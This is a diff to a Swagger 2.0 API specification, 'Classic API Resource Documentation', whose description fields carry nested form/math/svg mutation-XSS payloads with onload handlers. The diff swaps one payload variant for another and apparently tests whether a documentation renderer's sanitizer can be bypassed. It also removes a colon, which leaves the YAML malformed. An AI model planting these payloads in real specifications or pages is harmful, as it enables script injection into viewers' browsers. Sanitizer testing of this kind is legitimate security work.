@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg/svg/svg/On/OnLoad=alert('document.domain')>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg onx=() onload=(confirm)(1)>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,14 +28,14 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<svg/svg/svg/On/OnLoad=alert('document.domain')>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<svg onx=() onload=(confirm)(1)>"></form>
 
           format: int64
           in: path
           name: id
           required: true
           type: integer
-      responses:
+      responses
         '200':
           description: No response was specified
       tags:
